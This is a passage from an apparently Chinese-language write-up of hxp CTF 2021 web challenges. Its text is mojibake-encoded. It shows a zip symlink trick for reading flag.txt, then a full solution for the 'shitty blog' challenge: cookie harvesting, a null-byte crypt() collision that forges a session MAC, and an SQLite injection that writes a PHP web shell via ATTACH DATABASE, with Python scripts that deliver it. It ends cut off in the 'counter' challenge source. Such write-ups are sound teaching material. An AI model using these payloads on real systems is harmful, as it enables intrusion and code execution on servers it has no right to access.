&lt;p>æˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸ªæŒ‡å‘&lt;code>file:&lt;/code>æ–‡ä»¶å¤¹ä¸­çš„xyzï¼ˆä»»æ„æ–‡ä»¶ï¼‰çš„åä¸º&lt;code>flag.txt&lt;/code>çš„è½¯é“¾æŽ¥ï¼Œå®ƒåœ¨&lt;code>realpath&lt;/code>æ—¶è¢«æ‰©å±•ä¸º&lt;code>...../file:/xyz&lt;/code> å¯ä»¥é€šè¿‡ifæ¯”è¾ƒï¼Œè€Œåœ¨&lt;code>readfile&lt;/code>ä¸­åˆ™ä¼šæŒ‰ç…§urlçš„æ–¹å¼è¿›è¡Œè§£æžï¼ˆè·Ÿä»€ä¹ˆè½¯é“¾æŽ¥å°±æ²¡å…³ç³»äº†ï¼‰ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹çš„flag.txt&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">mkdir file:
&lt;span style="color:#111">cd&lt;/span> file:
touch amiz.txt
ln -s amiz.txt flag.txt
&lt;span style="color:#111">cd&lt;/span> ..
zip -ry tttttemp.zip file:
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220105743255.png" alt="image-20211220105743255">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220105724345.png" alt="image-20211220105724345">&lt;/p>
&lt;p>&lt;code>hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://mikecat.github.io/ctf-writeups/2021/20211218_hxp_CTF_2021/WEB/unzipper/#en">wp&lt;/a>&lt;/p>
&lt;h2 id="shitty-blog">shitty blog&lt;/h2>
&lt;blockquote>
&lt;p>Please use my shitty blog ðŸ¤Ž!&lt;/p>
&lt;p>http://65.108.176.96:8888/&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code class="language-php+HTML" data-lang="php+HTML">&amp;lt;?php
// TODO: fully implement multi-user / guest feature :(
$secret = 'SECRET_PLACEHOLDER';
$salt = '$6$'.substr(hash_hmac('md5', $_SERVER['REMOTE_ADDR'], $secret), 16).'$';
if(! isset($_COOKIE['session'])){
$id = random_int(1, PHP_INT_MAX);
$mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);
}
else {
$session = explode('|', $_COOKIE['session']);
if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
exit();
}
$id = $session[0];
$mac = $session[1];
}
setcookie('session', $id.'|'.$mac);
$sandbox = './data/'.md5($salt.'|'.$id.'|'.$mac);
if(! is_dir($sandbox)) {
mkdir($sandbox);
}
$db = new PDO('sqlite:'.realpath($sandbox).'/blog.sqlite3');
$db-&amp;gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db-&amp;gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$schema = &amp;quot;
CREATE TABLE IF NOT EXISTS user (id INTEGER PRIMARY KEY, name VARCHAR(255));
CREATE TABLE IF NOT EXISTS entry (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, content TEXT);
INSERT OR IGNORE INTO user (id, name) VALUES (0, 'System');
INSERT OR IGNORE INTO entry (id, user_id, content) VALUES (0, 0, 'Welcome to your new blog - ðŸš©ðŸš©ðŸš© Ê•â€¢Ìá´¥â€¢Ì€Ê”ã£ðŸ¤Ž ðŸš©ðŸš©ðŸš©');
&amp;quot;;
$db-&amp;gt;exec($schema);
function get_entries($db){
$sth = $db-&amp;gt;query('SELECT id, user_id, content FROM entry ORDER BY id DESC');
return $sth-&amp;gt;fetchAll();
}
function get_user($db, $user_id) : string {
foreach($db-&amp;gt;query(&amp;quot;SELECT name FROM user WHERE id = {$user_id}&amp;quot;) as $user) {
return $user['name'];
}
return 'me';
}
function insert_entry($db, $content, $user_id) {
$sth = $db-&amp;gt;prepare('INSERT INTO entry (content, user_id) VALUES (?, ?)');
$sth-&amp;gt;execute([$content, $user_id]);
}
function delete_entry($db, $entry_id, $user_id) {
$db-&amp;gt;exec(&amp;quot;DELETE from entry WHERE {$user_id} &amp;lt;&amp;gt; 0 AND id = {$entry_id}&amp;quot;);
}
if(isset($_POST['content'])) {
insert_entry($db, htmlspecialchars($_POST['content']), $id);
header('Location: /');
exit;
}
$entries = get_entries($db);
if(isset($_POST['delete'])) {
foreach($entries as $key =&amp;gt; $entry) {
if($_POST['delete'] === $entry['id']){
delete_entry($db, $entry['id'], $entry['user_id']);
break;
}
}
header('Location: /');
exit;
}
foreach($entries as $key =&amp;gt; $entry) {
$entries[$key]['user'] = get_user($db, $entry['user_id']);
}
?&amp;gt;
&amp;lt;!doctype html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
&amp;lt;title&amp;gt;My shitty Blog&amp;lt;/title&amp;gt;
&amp;lt;link rel=&amp;quot;icon&amp;quot; type=&amp;quot;image/png&amp;quot; href=&amp;quot;/favicon.png&amp;quot;/&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;My shitty blog&amp;lt;/h1&amp;gt;
&amp;lt;form method=&amp;quot;post&amp;quot;&amp;gt;
&amp;lt;textarea cols=&amp;quot;50&amp;quot; rows=&amp;quot;10&amp;quot; name=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;/textarea&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Post&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php foreach($entries as $entry):?&amp;gt;
&amp;lt;div&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;?= $entry['content'] ?&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;small&amp;gt;By &amp;lt;?= $entry['user'] ?&amp;gt; &amp;lt;/small&amp;gt;
&amp;lt;form method=&amp;quot;post&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;delete&amp;quot; value=&amp;quot;&amp;lt;?= $entry['id'] ?&amp;gt;&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Delete&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;hr&amp;gt;
&amp;lt;?php endforeach ?&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ä½¿ç”¨sqliteåšæ•°æ®åº“ï¼Œéžæ¨¡æ‹Ÿé¢„å¤„ç†ï¼Œå¦å¤–å¾ˆå‘çˆ¹çš„æŠŠæ¯ä¸€æ¬¡çš„è¯·æ±‚çš„è®¾ç½®äº†&lt;code>header('Location: /');&lt;/code>å¯¼è‡´æ²¡æœ‰å›žæ˜¾ï¼ˆå¯¼è‡´è™½ç„¶å®ƒå¼€å¯äº†æŠ¥é”™çš„é€‰é¡¹ ä½†æ˜¯æŠŠå¸¸è§„çš„æŠ¥é”™æ³¨å…¥ç»™æ¯™æŽ‰äº†ï¼‰&lt;/p>
&lt;p>é¦–å…ˆä»Žå‡ ä¸ªæ•°æ®åº“å‡½æ•°ä¸­æ‰¾æ˜¯å¦æœ‰å¯ä»¥æ³¨å…¥çš„ç‚¹ï¼Œ&lt;code>get_entries&lt;/code>æ— è¾“å…¥å€¼ç”¨ä¸äº†ï¼Œ&lt;code>insert_entry&lt;/code>ç”¨äº†prepareé¢„å¤„ç†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172155830.png" alt="image-20211220172155830">&lt;/p>
&lt;p>å‰©ä¸‹çš„&lt;code>get_user&lt;/code>å’Œ&lt;code>delete_entry&lt;/code>æœ‰æ˜Žæ˜¾çš„sqlè¯­å¥æ‹¼æŽ¥ï¼ˆæ— è¿‡æ»¤ï¼‰ï¼Œå°è¯•åˆ©ç”¨&lt;code>delete_entry&lt;/code>çš„&lt;code>$user_id&lt;/code>è¿›è¡Œsqlæ³¨å…¥ï¼Œè€Œdockerfileä¸­è®¾ç½®äº†flag.txtçš„æƒé™ï¼Œæˆ‘ä»¬åªèƒ½rceæ¥æ‰§è¡Œ/readflagï¼Œæ‰€ä»¥æ³¨å…¥ä¸æ˜¯æ³¨æ•°æ®è€Œæ˜¯åº”è¯¥æ³¨ä¸€ä¸ªç±»ä¼¼&lt;code>&amp;lt;?php echo system('/readflag');?&amp;gt;&lt;/code>è¿™æ ·çš„shellè¿›åŽ»ï¼ˆå…·ä½“æ“ä½œåœ¨åŽé¢&lt;/p>
&lt;p>è€Œè¿™é‡Œçš„&lt;code>$user_id&lt;/code>æˆ‘ä»¬å¯ä»¥é€šè¿‡postå†deleteæ¥é€šè¿‡sessionä¸­çš„&lt;code>$id&lt;/code>æ¥æŽ§åˆ¶ï¼Œè¿”å›žä»£ç ä¸­åº·åº·sessionéƒ¨åˆ†çš„å†…å®¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172430751.png" alt="image-20211220172430751">&lt;/p>
&lt;p>æ˜¯æ²™ç®±å¼çš„sqliteæ•°æ®åº“ï¼Œé‰´æƒéƒ¨åˆ†ä½¿ç”¨cookie+å¤æ‚çš„ä¸€å †åŠ ç›å“ˆå¸Œå‡½æ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220172500240.png" alt="image-20211220172500240">&lt;/p>
&lt;p>ä¸ºäº†é€šè¿‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">hash_equals&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hash_hmac&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">$salt&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">$salt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çš„ifæ ¡éªŒï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ ä¸€ä¸ªåˆç†çš„&lt;code>session&lt;/code>å€¼ ç±»ä¼¼&lt;code>$id.'|'.$mac&lt;/code>è¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">random_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">PHP_INT_MAX&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hash_hmac&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">$salt&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯æ—¢ä¸çŸ¥é“&lt;code>secret&lt;/code>ä¹Ÿä¸çŸ¥é“&lt;code>salt&lt;/code>â€”â€”äºŽæ˜¯æ¯”èµ›çš„æ—¶å€™å°±å¡åˆ°äº†è¿™é‡Œï¼Œä½†æ˜¯å®žé™…ä¸Šè¿™é‡Œæ˜¯å¯ä»¥çªç ´çš„&lt;/p>
&lt;p>æ³¨æ„&lt;code>crypt()&lt;/code>çš„&lt;code>true&lt;/code>å‚æ•°ï¼Œå®ƒä¼šä½¿è¾“å‡ºå€¼æ˜¯raw binary dataï¼Œä¹Ÿå°±æ˜¯è¯´å‘ç”Ÿè¿™ç§çŽ°è±¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;aaaaaaa&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;aaaaaaa&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">aaaaa&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;$2a$07$usesomesillystringforsalt$&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;$2a$07$usesomesillystringforsalt$&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220174142440.png" alt="image-20211220174142440">&lt;/p>
&lt;p>æ²¡é”™ï¼æ˜¯ç†Ÿæ‚‰çš„é…æ–¹â€”â€”00æˆªæ–­ï¼Œ&lt;code>\x00&lt;/code>ä¹‹åŽçš„å†…å®¹å°†è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹ä»»ä½•&lt;code>$id&lt;/code>md5ä¹‹åŽä»¥&lt;code>\x00&lt;/code>å¼€å¤´çš„å€¼è¿›è¡Œ&lt;code>crypt()&lt;/code>ä¹‹åŽå¾—åˆ°çš„&lt;code>$mac&lt;/code>æ˜¯ä¸€æ ·çš„ï¼&lt;/p>
&lt;p>çŽ°åœ¨éœ€è¦ç¡®å®šè¿™ä¸ª&lt;code>$id&lt;/code>å€¼ï¼Œæ˜¾ç„¶æœ¬åœ°å’Œè¿œç¨‹çš„&lt;code>$secret&lt;/code>å€¼ä¸ä¸€æ · æ— æ³•æœ¬åœ°ç›´æŽ¥ä¼ªé€ ï¼Œæˆ‘ä»¬çš„æ–¹æ³•æ˜¯å¤§é‡çš„GETè¯·æ±‚æ¥èŽ·å¾—å¤§é‡çš„æ–°cookieï¼Œè§‚å¯Ÿ&lt;code>|&lt;/code>ä¹‹åŽçš„éƒ¨åˆ†çš„å‡ºçŽ°ç›¸åŒçš„é¢‘çŽ‡ï¼Œå› ä¸ºä¸Šè¿°æƒ…å†µå‘ç”Ÿçš„æ¦‚çŽ‡æ˜¯1/256ï¼Œå¦‚æžœå‘ç”Ÿäº†ä¸¤æ¬¡ å°±å¯ä»¥ç¡®å®šæ˜¯æˆ‘ä»¬è¦æ‰¾çš„&lt;code>$mac&lt;/code>å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">tqdm&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">tqdm&lt;/span>
&lt;span style="color:#111">macs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">tqdm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://65.108.176.96:8888/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">macs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;%7C&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">mac_0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">max&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">macs&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">macs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac_0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182703931.png" alt="image-20211220182703931">&lt;/p>
&lt;p>æœ‰äº†åˆé€‚çš„&lt;code>$mac&lt;/code>ä¹‹åŽå†è€ƒè™‘å¦‚ä½•é€šè¿‡sqliå†™shellï¼Œæ ¹æ®&lt;a href="https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet">cheat sheet&lt;/a>æ•´ä¸€ä¸ªpayload&lt;/p>
&lt;pre tabindex="0">&lt;code>1=1; ATTACH DATABASE '/var/www/html/data/qazxsw.php' as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES ('&amp;lt;?php echo system(\&amp;quot;/readflag\&amp;quot;); ?&amp;gt;'); -- xyz
&lt;/code>&lt;/pre>&lt;p>çœ‹ç€å¾ˆéªšçš„å†™shellæ–¹å¼ï¼Œä¹‹å‰åšé¢˜æ²¡æœ‰è§åˆ°è¿‡ï¼ˆè¿™æ³¢å­¦åˆ°äº†ï¼‰ï¼Œè¿™ä¸ªpayloadå°±æ”¾å…¥cookieçš„&lt;code>$id&lt;/code>éƒ¨åˆ†å³å¯ï¼Œå¸¦ç€cookieè®¿é—®é¡µé¢postå†deleteä¸€æ¡å†…å®¹ï¼Œå†è½¬åˆ°/data/qazxsw.phpé¡µé¢å°±å¯ä»¥çœ‹åˆ°flagäº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#111">remote_0_mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;FlDRLIZWMTqtYjAugBkToe66C3Q5PaXnGAyzGL6VpiCmfl&lt;/span>&lt;span style="color:#d88200">%2F&lt;/span>&lt;span style="color:#d88200">QjtvYr2QavlI9lmsrMbQnpPfIMr979D1E4bBa71&amp;#39;&lt;/span>
&lt;span style="color:#111">cont&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1=1; ATTACH DATABASE &amp;#39;/var/www/html/data/qazxsw.php&amp;#39; as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES (&amp;#39;&amp;lt;?php echo system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">/readflag&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">); ?&amp;gt;&amp;#39;); -- xyz&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cont&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">random_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_letters&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">cookies&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">random_id&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;%7C&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">remote_0_mac&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://65.108.176.96:8888/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cont&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182749173.png" alt="image-20211220182749173">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220182536863.png" alt="image-20211220182536863">&lt;/p>
&lt;p>&lt;code>hxp{dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://wachter-space.de/2021/12/19/hxp_21">wp&lt;/a>&lt;/p>
&lt;h2 id="counter">***counter&lt;/h2>
&lt;blockquote>
&lt;p>Please check out our minimal view counter. I think itâ€™s secure. Anyway please no hacks.&lt;/p>
&lt;p>http://49.12.232.139:8008/&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$rmf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -f -- &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">//
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;default&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./data&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;reset&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^[a-zA-Z0-9]+$/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
